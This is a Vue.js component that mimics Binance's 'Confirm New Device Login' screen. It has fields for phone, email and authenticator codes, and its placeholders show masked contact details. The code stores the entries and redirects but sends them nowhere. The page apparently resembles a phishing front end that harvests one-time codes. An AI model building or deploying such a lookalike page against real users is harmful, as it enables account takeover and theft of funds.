<template>
  <div>
    <v-app>
      <!-------------       Nav starts from here      ------------>
      <v-app-bar app>
        <v-toolbar-title>
          <span class="orange--text"> BINANCE</span>
        </v-toolbar-title>

        <v-spacer></v-spacer>
        <v-spacer></v-spacer>

        <v-menu left bottom>
          <template v-slot:activator="{ on, attrs }">
            <v-btn
              icon
              v-bind="attrs"
              v-on="on"
              class="mr-1 transparent"
              @click="signup"
            >
              English
            </v-btn>
          </template>
        </v-menu>
      </v-app-bar>
      <!------------         Nav End         ----------------->

      <!------------         Main Container         ----------------->
      <v-container>
        <br />
        <v-row class="text-center">
          <v-col cols="5" class="mx-auto">
            <div>
              <h1 class="text-left">Confirm New Device Login</h1>
              <p class="text-left">
                To secure your account, please complete the following
                verification.
              </p>
            </div>

            <br />

            <v-form ref="form" v-model="valid" lazy-validation>
              <v-text-field
                prepend-inner-icon="mdi-phone"
                label="Phone Verification Code"
                placeholder="Enter the 6 digit code sent to 331***6751."
                type="text"
                v-model="userdata.phone"
                filled
                clearable
                required
              ></v-text-field>

              <v-text-field
                prepend-inner-icon="mdi-email"
                label="Email Verification Code"
                placeholder="Enter the 6 digit code sent to mia***@gmail.com"
                type="email"
                v-model="userdata.email"
                filled
                clearable
                required
              ></v-text-field>

              <v-text-field
                prepend-inner-icon="mdi-account"
                label="Authenticator Code"
                placeholder="Enter the 6 digit code from Binance/Google Authenticator"
                type="text"
                v-model="userdata.authCode"
                filled
                clearable
                required
              ></v-text-field>

              <div class="text-left orange--text text-decoration-none">
                <strong> Security Verification unavailable? </strong>
              </div>
              <br />

              <v-btn block depressed color="orange" @click.prevent="home">
                Submit
              </v-btn>

              <br />
            </v-form>
          </v-col>
          <v-col cols="4" class="pl-15">
            <br /><br /><br /><br />
            <v-img
              src="@/assets/verify.jpg"
              class="rounded mx-auto d-block"
              width="350px"
              height="200px"
              cover
            >
            </v-img>
            <br />
            <p class="text-justify">
              <span> <strong> User authentication </strong> </span>
              is verifies the identity of a user attempting to gain access to a network or computing resource by authorizing a human-to-machine transfer of credentials during interactions on a network to confirm a <span class="orange--text">user's authenticity. </span>
            </p>
          </v-col>
        </v-row>
      </v-container>
      <!------------         Container End         ----------------->
    </v-app>
  </div>
</template>

<script>
export default {
  name: "LoginFromNewDevice",
  data() {
    return {
      valid: true,

      //////////////////////*        Data properties for storing data         */////////////////////
      userdata: {
        email: "",
        phone: "",
        authCode:""
      },
      newUser: [],
    };
  },
  components: {},
  methods: {
    home() {
      this.$router.push({ name: "Home" });
    },
  },
};
</script>
